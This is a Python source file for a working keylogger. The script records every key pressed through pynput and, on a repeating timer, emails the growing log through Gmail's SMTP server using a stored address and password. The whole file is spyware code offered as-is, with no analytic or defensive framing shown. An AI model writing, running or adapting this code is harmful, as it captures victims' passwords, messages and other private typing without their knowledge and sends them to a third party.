import email
from traceback import print_tb
from pynput import keyboard
import smtplib, ssl
import threading
import time
import os

class Keylogger:
    def __init__(self, time, mail, password):
        self.log_content = ""  # Store captured keystrokes
        self.time_interval = time  # Email interval in seconds
        self.email = mail
        self.password = password

    def log(self, string):
        self.log_content = self.log_content + string

    def on_press(self, key):
        try:
            key_char = str(key.char)  # Regular keys (letters, numbers)
        except AttributeError:
            if key == keyboard.Key.space:
                key_char = " "
            else:
                key_char = " [" + str(key) + "] "  # Special keys (Enter, Shift, etc.)
        self.log(key_char)

    def mail_sender(self, mail, password, message):
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()  # Enable encryption
            server.login(mail, password)
            server.sendmail(mail, mail, message)  # Send to self
            server.quit()
        except:
            print("Have porblems about sending mail.")

    def mail(self):
        self.mail_sender(self.email, self.password, "\n\n" + self.log_content)
        timer = threading.Timer(self.time_interval, self.mail)  # Schedule next email
        timer.start()

    def start(self):
        self.mail()  # Start email timer
        listener = keyboard.Listener(on_press=self.on_press)  # Monitor keyboard
        listener.start()
        listener.join()  # Keep program running